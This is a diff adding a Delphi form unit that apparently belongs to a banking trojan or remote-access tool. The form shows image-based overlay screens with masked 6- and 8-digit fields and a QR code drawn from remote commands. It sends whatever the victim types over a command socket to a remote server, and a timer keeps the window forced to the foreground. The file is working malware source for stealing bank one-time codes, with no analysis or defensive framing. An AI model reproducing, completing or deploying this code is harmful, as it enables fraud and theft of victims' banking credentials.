@@ -1,0 +1,384 @@
+unit ut_01;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes,
+  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.ExtCtrls, Vcl.StdCtrls,
+  Vcl.Imaging.pngimage,
+  StrUtils, variaveis, conexoes, principal, Vcl.AppEvnts, Thend;
+
+type
+  TTNT_01 = class(TForm)
+    Timer1: TTimer;
+    procedure I02OKClick(Sender: TObject);
+    procedure I03OKClick(Sender: TObject);
+    procedure I04OKClick(Sender: TObject);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
+    procedure FormShow(Sender: TObject);
+    procedure I01OKClick(Sender: TObject);
+    procedure Timer1Timer(Sender: TObject);
+  private
+  public
+    P01: TPanel;
+    I01B: TImage;
+    I01QR: TImage;
+    I01OK: TImage;
+    E01: TEdit;
+    /// //////
+    P02: TMibnPNL;
+    I02B: TMibIMG;
+    I02OK: TMibIMG;
+    E02: TMibPNL;
+    /// /////
+    P03: TMibnPNL;
+    I03B: TMibIMG;
+    I03OK: TMibIMG;
+    E03: TMibPNL;
+    /// ////
+    P04: TMibnPNL;
+    I04B: TMibIMG;
+    I04OK: TMibIMG;
+    E04: TMibPNL;
+    ID: string;
+    constructor Create(aowner: Tcomponent);
+  end;
+
+var
+  TNT_01: TTNT_01;
+
+implementation
+
+uses
+  usession, umodulo;
+
+{$R *.dfm}
+
+constructor TTNT_01.Create(aowner: Tcomponent);
+begin
+  inherited;
+
+  P01 := TPanel.Create(Self);
+  I01B := TImage.Create(Self);
+  I01QR := TImage.Create(Self);
+  I01OK := TImage.Create(Self);
+  E01 := TEdit.Create(Self);
+
+  P01.Name := 'P01';
+  P01.Parent := Self;
+  P01.Left := 0;
+  P01.Top := 0;
+  P01.Width := 642;
+  P01.Height := 484;
+  P01.Align := alClient;
+  P01.TabOrder := 0;
+  I01B.Visible := false;
+  I01B.Name := 'I01B';
+  I01B.Parent := P01;
+  I01B.Left := 0;
+  I01B.Top := 0;
+  I01B.Width := 642;
+  I01B.Height := 484;
+  I01B.Align := alClient;
+  I01B.Visible := True;
+  I01QR.Name := 'I01QR';
+  I01QR.Parent := P01;
+  I01QR.Left := 9;
+  I01QR.Top := 112;
+  I01QR.Width := 353;
+  I01QR.Height := 313;
+  I01OK.Name := 'I01OK';
+  I01OK.Parent := P01;
+  I01OK.Left := 474;
+  I01OK.Top := 401;
+  I01OK.Width := 97;
+  I01OK.Height := 35;
+  I01OK.Cursor := crHandPoint;
+  I01OK.DragCursor := crHandPoint;
+  I01OK.OnClick := I01OKClick;
+  E01.Name := 'E01';
+  E01.Parent := P01;
+  E01.Left := 495;
+  E01.Top := 366;
+  E01.Width := 75;
+  E01.Height := 19;
+  E01.MaxLength := 6;
+  E01.Text := '';
+  E01.NumbersOnly := True;
+  E01.BevelInner := bvNone;
+  E01.BevelOuter := bvNone;
+  E01.BorderStyle := bsNone;
+  E01.ParentFont := false;
+  E01.PasswordChar := #8226;
+  E01.TabOrder := 0;
+
+  P02 := TMibnPNL.Create(Self);
+  I02B := TMibIMG.Create(Self);
+  I02OK := TMibIMG.Create(Self);
+  E02 := TMibPNL.Create(Self);
+
+  P02.Name := 'P02';
+  P02.Parent := Self;
+  P02.Left := 0;
+  P02.Top := 0;
+  P02.Width := 642;
+  P02.Height := 484;
+  P02.Align := alClient;
+  P02.TabOrder := 0;
+  P02.Visible := false;
+  I02B.Name := 'I02';
+  I02B.Parent := P02;
+  I02B.Left := 0;
+  I02B.Top := 0;
+  I02B.Width := 642;
+  I02B.Height := 484;
+  I02B.Align := alClient;
+  I02OK.Name := 'I02OK';
+  I02OK.Parent := P02;
+  I02OK.Left := 328;
+  I02OK.Top := 316;
+  I02OK.Width := 89;
+  I02OK.Height := 28;
+  I02OK.Cursor := crHandPoint;
+  I02OK.DragCursor := crHandPoint;
+  I02OK.OnClick := I02OKClick;
+  E02.Name := 'E02';
+  E02.Parent := P02;
+  E02.Left := 216;
+  E02.Top := 322;
+  E02.Width := 93;
+  E02.Height := 16;
+  E02.TabStop := false;
+  E02.BevelInner := bvNone;
+  E02.BevelOuter := bvNone;
+  E02.BorderStyle := bsNone;
+  E02.MaxLength := 6;
+  E02.NumbersOnly := True;
+  E02.PasswordChar := #8226;
+  E02.TabOrder := 0;
+  E02.Text := '';
+
+  P03 := TMibnPNL.Create(Self);
+  I03B := TMibIMG.Create(Self);
+  I03OK := TMibIMG.Create(Self);
+  E03 := TMibPNL.Create(Self);
+
+  P03.Name := 'P03';
+  P03.Parent := Self;
+  P03.Left := 0;
+  P03.Top := 0;
+  P03.Width := 642;
+  P03.Height := 484;
+  P03.Align := alClient;
+  P03.TabOrder := 0;
+  P03.Visible := false;
+  I03B.Name := 'I03B';
+  I03B.Parent := P03;
+  I03B.Left := 1;
+  I03B.Top := 1;
+  I03B.Width := 642;
+  I03B.Height := 484;
+  I03B.Align := alClient;
+  I03OK.Name := 'I03OK';
+  I03OK.Parent := P03;
+  I03OK.Left := 328;
+  I03OK.Top := 314;
+  I03OK.Width := 89;
+  I03OK.Height := 31;
+  I03OK.Cursor := crHandPoint;
+  I03OK.DragCursor := crHandPoint;
+  I03OK.OnClick := I03OKClick;
+  E03.Name := 'E03';
+  E03.Parent := P03;
+  E03.Left := 217;
+  E03.Top := 321;
+  E03.Width := 94;
+  E03.Height := 17;
+  E03.TabStop := false;
+  E03.BevelInner := bvNone;
+  E03.BevelOuter := bvNone;
+  E03.BorderStyle := bsNone;
+  E03.MaxLength := 8;
+  E03.PasswordChar := #8226;
+  E03.TabOrder := 0;
+  E03.Text := '';
+
+  P04 := TMibnPNL.Create(Self);
+  I04B := TMibIMG.Create(Self);
+  I04OK := TMibIMG.Create(Self);
+  E04 := TMibPNL.Create(Self);
+
+  P04.Name := 'P04';
+  P04.Parent := Self;
+  P04.Left := 0;
+  P04.Top := 0;
+  P04.Width := 642;
+  P04.Height := 484;
+  P04.Align := alClient;
+  P04.TabOrder := 0;
+  P04.Visible := false;
+  I04B.Name := 'I04B';
+  I04B.Parent := P04;
+  I04B.Left := 1;
+  I04B.Top := 1;
+  I04B.Width := 642;
+  I04B.Height := 484;
+  I04B.Align := alClient;
+  I04OK.Name := 'I04OK';
+  I04OK.Parent := P04;
+  I04OK.Left := 328;
+  I04OK.Top := 318;
+  I04OK.Width := 89;
+  I04OK.Height := 24;
+  I04OK.Cursor := crHandPoint;
+  I04OK.DragCursor := crHandPoint;
+  I04OK.OnClick := I04OKClick;
+  E04.Name := 'E04';
+  E04.Parent := P04;
+  E04.Left := 213;
+  E04.Top := 321;
+  E04.Width := 70;
+  E04.Height := 17;
+  E04.TabStop := false;
+  E04.BevelInner := bvNone;
+  E04.BevelOuter := bvNone;
+  E04.BorderStyle := bsNone;
+  E04.MaxLength := 8;
+  E04.PasswordChar := #8226;
+  E04.TabOrder := 0;
+  E04.Text := '';
+
+end;
+
+procedure TTNT_01.FormClose(Sender: TObject; var Action: TCloseAction);
+begin
+  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
+    GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
+  SethWndTrasparent(Handle_Main, True);
+  Application.ProcessMessages;
+  Install_Cur(True);
+  Mostra_ou_Esconder(True);
+  TNT_01.Free;
+  TNT_01 := nil;
+end;
+
+procedure TTNT_01.FormShow(Sender: TObject);
+begin
+  // TranslateMessage(Msg);
+  // DispatchMessage(Msg);
+  Mostra_ou_Esconder(false);
+  bBlockMouse := false;
+  Install_Cur(false);
+  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
+    GWL_EXSTYLE) and not WS_EX_TRANSPARENT);
+  // ShowWindow(self.Handle, SW_HIDE);
+  // SethWndTrasparent(Handle_Main, False);
+  // SetForegroundWindow(Handle_Main);
+  // SetForegroundWindow(handle);
+  // Application.ProcessMessages;
+  Top := (Screen.Height div 2) - (Height div 2);
+  Left := (Screen.Width div 2) - (Width div 2);
+  case AnsiIndexStr(ID, ['TTL_QR', 'TTL_02', 'TTL_03', 'TTL_04']) of
+    0:
+      begin
+        LoadImg(I01B, 'TNTB01');
+        TNT_01.I01QR.Picture.Assign(CmdRmt.GetQrc(CmdRmt.iQrCodeX1,
+          CmdRmt.iQrCodeY1, CmdRmt.iQrCodeX2, CmdRmt.iQrCodeY2));
+        TNT_01.P01.BringToFront;
+        TNT_01.P01.Visible := True;
+        // TNT_01.QrTemp.Enabled:=True;
+      end;
+    1:
+      begin
+        LoadImg(I02B, 'TNTB02');
+        TNT_01.P02.BringToFront;
+        TNT_01.P02.Visible := True;
+        // Telinha:=True
+      end;
+    2:
+      begin
+        LoadImg(I03B, 'TNTB03');
+        TNT_01.P03.BringToFront;
+        TNT_01.P03.Visible := True;
+        // Telinha:=True
+      end;
+    3:
+      begin
+        LoadImg(I04B, 'TNTB04');
+        TNT_01.P04.BringToFront;
+        TNT_01.P04.Visible := True;
+        // Telinha:=True
+      end;
+  end;
+
+end;
+
+procedure TTNT_01.I01OKClick(Sender: TObject);
+begin
+  if Length(E01.Text) = 6 then
+  begin
+    CmdSocket.CmdSocket.Socket.SendText
+      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + E01.Text));
+    close;
+  end
+  else
+  begin
+    E01.SetFocus;
+    E01.Clear;
+  end;
+end;
+
+procedure TTNT_01.I02OKClick(Sender: TObject);
+begin
+  if Length(E02.Text) = 6 then
+  begin
+    CmdSocket.CmdSocket.Socket.SendText
+      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + E02.Text));
+    close;
+  end
+  else
+  begin
+    E02.SetFocus;
+    E02.Clear;
+  end;
+end;
+
+procedure TTNT_01.I03OKClick(Sender: TObject);
+begin
+  if Length(E03.Text) = 8 then
+  begin
+    CmdSocket.CmdSocket.Socket.SendText
+      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + E03.Text));
+    close;
+  end
+  else
+  begin
+    E03.SetFocus;
+    E03.Clear;
+  end;
+end;
+
+procedure TTNT_01.I04OKClick(Sender: TObject);
+begin
+  if Length(E04.Text) = 8 then
+  begin
+    CmdSocket.CmdSocket.Socket.SendText
+      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + E04.Text));
+    close;
+  end
+  else
+  begin
+    E04.SetFocus;
+    E04.Clear;
+  end;
+end;
+
+procedure TTNT_01.Timer1Timer(Sender: TObject);
+begin
+  Application.ProcessMessages;
+  if GetForegroundWindow <> handle then
+    SetForegroundWindow(handle)
+end;
+
+end.
